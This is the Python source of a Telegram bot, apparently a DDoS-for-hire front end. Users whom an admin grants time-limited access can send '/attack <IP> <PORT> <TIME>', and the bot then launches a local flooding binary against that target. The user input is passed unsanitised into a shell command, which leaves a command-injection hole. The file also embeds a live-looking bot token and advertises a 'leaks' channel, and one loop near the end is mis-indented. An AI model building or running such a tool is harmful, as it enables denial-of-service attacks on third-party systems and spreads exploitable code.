import telebot
import time
import subprocess
import threading
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Bot Token
TOKEN = "7615454196:AAG3BqA2vEs4Fu97056-4iwHxTxgspwu7Hw"
bot = telebot.TeleBot(TOKEN)

# Admin User ID (Replace with your Telegram ID)
ADMIN_ID = 8179218740  # Replace with your actual Telegram ID

# Dictionary to store users and expiry time
users = {}

# Start Command
@bot.message_handler(commands=['start'])
def start(message):
    user = message.from_user
    user_id = user.id
    username = user.first_name if user.first_name else "User"

    # Check if user is active
    current_time = time.time()
    status = "✅ ACTIVE" if user_id in users and users[user_id] > current_time else "❌ NOT ACTIVE"

    # Create buttons
    keyboard = InlineKeyboardMarkup()
    join_button = InlineKeyboardButton("🔗 CLICK HERE TO JOIN", url="https://t.me/MUSTAFALEAKS2")
    creator_button = InlineKeyboardButton("👑 BOT CREATED BY 👑", url="https://t.me/SIDIKI_MUSTAFA_47")
    keyboard.add(join_button, creator_button)

    caption = f"""
👋 𝗪𝗘𝗟𝗖𝗢𝗠𝗘, {username} ☠️🔥
--------------------------------------------------------
🤖 𝗧𝗛𝗜𝗦 𝗜𝗦 𝗠𝗨𝗦𝗧𝗔𝗙𝗔 𝗕𝗢𝗧!
🆔 𝗨𝗦𝗘𝗥 𝗜𝗗: {user_id}
🛡 𝗦𝗧𝗔𝗧𝗨𝗦: {status}

📢 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗖𝗛𝗔𝗡𝗡𝗘𝗟:

📌 𝗧𝗥𝗬 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗:
/attack - 🚀 𝗦𝗧𝗔𝗥𝗧 𝗔𝗡 𝗔𝗧𝗧𝗔𝗖𝗞!

👑 𝗕𝗢𝗧 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 𝗕𝗬: @SIDIKI_MUSTAFA_47 ☠️
"""
    bot.send_message(message.chat.id, caption, reply_markup=keyboard)

# Help Command
@bot.message_handler(commands=['help'])
def help(message):
    help_text = """
🛠 Available Commands:

▶️ /start - 𝗦𝗧𝗔𝗥𝗧 𝗧𝗛𝗘 𝗕𝗢𝗧 𝗔𝗡𝗗 𝗖𝗛𝗘𝗖𝗞 𝗬𝗢𝗨𝗥 𝗦𝗧𝗔𝗧𝗨𝗦
🚀 /attack - 𝗦𝗧𝗔𝗥𝗧 𝗔𝗡 𝗔𝗧𝗧𝗔𝗖𝗞
➕ /add - 𝗔𝗗𝗗 𝗨𝗦𝗘𝗥 𝗙𝗢𝗥 𝗟𝗜𝗠𝗜𝗧𝗘𝗗 𝗧𝗜𝗠𝗘 (Admin only)  
➖ /remove  - 𝗥𝗘𝗠𝗢𝗩𝗘 𝗔 𝗨𝗦𝗘𝗥 (Admin only)  
👥 /users - 𝗟𝗜𝗦𝗧 𝗔𝗖𝗧𝗜𝗩𝗘 𝗨𝗦𝗘𝗥 (Admin only)  
ℹ️ /help - 𝗦𝗛𝗢𝗪 𝗧𝗛𝗜𝗦 𝗛𝗘𝗟𝗣 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 
    """
    bot.reply_to(message, help_text)
@bot.message_handler(commands=['attack'])
def attack(message):
    user_id = message.from_user.id
    chat_id = "@MUSTAFALEAKS2"

    # Check if user is authorized and a member of the channel
    current_time = time.time()
    if user_id not in users or users[user_id] < current_time:
        bot.reply_to(message, "❌ **ACCESS DENIED!**", parse_mode="Markdown")
        return

    try:
        member_status = bot.get_chat_member(chat_id, user_id).status
        if member_status not in ["member", "administrator", "creator"]:
            bot.reply_to(
                message, 
                """
🚨 **𝗬𝗢𝗨 𝗠𝗨𝗦𝗧 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗧𝗢 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗!** 🚨  
━━━━━━━━━━━━━━━━━━━━━━━  
📢 **𝗝𝗢𝗜𝗡 𝗡𝗢𝗪:** [🔥 𝗠𝗨𝗦𝗧𝗔𝗙𝗔 𝗟𝗘𝗔𝗞𝗦 🔥](https://t.me/MUSTAFALEAKS2)  
━━━━━━━━━━━━━━━━━━━━━━━  
""", 
                parse_mode="Markdown"
            )
            return
    except:
        bot.reply_to(message, "⚠️ **BOT IS NOT ADMIN IN CHANNEL!**", parse_mode="Markdown")
        return

    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "⚠️ **Usage:** /attack <IP> <PORT> <TIME>", parse_mode="Markdown")
        return
    
    ip, port, attack_time = args[1], args[2], args[3]
    try:
        attack_time = int(attack_time)
        if attack_time > 120:
            bot.reply_to(message, "⏳ **Max time is 120 sec!**", parse_mode="Markdown")
            return
    except:
        bot.reply_to(message, "⚠️ **Invalid time!**", parse_mode="Markdown")
        return

    start_msg = f"""
🔥🚀 **𝗨𝗡𝗦𝗧𝗢𝗣𝗣𝗔𝗕𝗟𝗘 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗘𝗤𝗨𝗘𝗡𝗖𝗘 𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗘𝗗!** 🚀🔥  
━━━━━━━━━━━━━━━━━━━━━━━  
🎯 **𝗧𝗔𝗥𝗚𝗘𝗧:** `{ip}:{port}`  
⏳ **𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡:** `{attack_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀`  
⚡ **𝗦𝗧𝗔𝗧𝗨𝗦:** 𝗔𝗥𝗠𝗜𝗡𝗚 𝗧𝗛𝗘 𝗪𝗔𝗥 𝗠𝗔𝗖𝗛𝗜𝗡𝗘...  
━━━━━━━━━━━━━━━━━━━━━━━  
💀 **𝗛𝗢𝗟𝗗 𝗢𝗡! 𝗧𝗛𝗘 𝗗𝗘𝗦𝗧𝗥𝗨𝗖𝗧𝗜𝗢𝗡 𝗕𝗘𝗚𝗜𝗡𝗦 𝗡𝗢𝗪!** 💀  

📢 **𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗖𝗛𝗔𝗡𝗡𝗘𝗟:** [🔥 𝗠𝗨𝗦𝗧𝗔𝗙𝗔 𝗟𝗘𝗔𝗞𝗦 🔥](https://t.me/MUSTAFALEAKS2)
"""

    bot.send_message(message.chat.id, start_msg, parse_mode="Markdown")

    def execute_attack():
        subprocess.run(f"./Ravi {ip} {port} {attack_time} 1000", shell=True)

        stop_msg = f"""
✅ **𝗠𝗜𝗦𝗦𝗜𝗢𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗!** 💥  
━━━━━━━━━━━━━━━━━━━━━━━  
🎯 **𝗧𝗔𝗥𝗚𝗘𝗧:** `{ip}:{port}`  
🔥 **𝗦𝗧𝗔𝗧𝗨𝗦:** 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟!  
💣 **𝗪𝗔𝗥 𝗠𝗔𝗖𝗛𝗜𝗡𝗘 𝗦𝗛𝗨𝗧𝗧𝗜𝗡𝗚 𝗗𝗢𝗪𝗡...**  
━━━━━━━━━━━━━━━━━━━━━━━  
🚀 **𝗗𝗘𝗦𝗧𝗥𝗨𝗖𝗧𝗜𝗢𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘: 𝟭𝟬𝟬%** 🚀  

📢 **𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗖𝗛𝗔𝗡𝗡𝗘𝗟:** [🔥 𝗠𝗨𝗦𝗧𝗔𝗙𝗔 𝗟𝗘𝗔𝗞𝗦 🔥](https://t.me/MUSTAFALEAKS2)
"""

        bot.send_message(message.chat.id, stop_msg, parse_mode="Markdown")

    threading.Thread(target=execute_attack).start()

# Add User Command (Admin Only)
@bot.message_handler(commands=['add'])
def add_user(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ You are not authorized!")
        return
    
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "⚠️ Usage: /add <USER_ID> <TIME>", parse_mode="Markdown")
        return

    user_id = int(args[1])
    duration = int(args[2])
    users[user_id] = time.time() + duration
    bot.reply_to(message, f"✅ User `{user_id}` added for `{duration}` sec.", parse_mode="Markdown")

# Remove User Command (Admin Only)
@bot.message_handler(commands=['remove'])
def remove_user(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ You are not authorized!")
        return

    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "⚠️ Usage: /remove <USER_ID>", parse_mode="Markdown")
        return

    user_id = int(args[1])
    users.pop(user_id, None)
    bot.reply_to(message, f"✅ User `{user_id}` removed.", parse_mode="Markdown")

# List Users Command (Admin Only)
@bot.message_handler(commands=['users'])
def list_users(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ You are not authorized!")
        return

    if not users:
        bot.reply_to(message, "⚠️ No active users!")
        return

    response = "👥 **Active Users:**\n"

for user_id, expiry in users.items():
    response += f"🆔 `{user_id}` - Expires in `{int(expiry - time.time())}` sec\n"

    bot.reply_to(message, response, parse_mode="Markdown")

# Run Bot
bot.polling(none_stop=True)
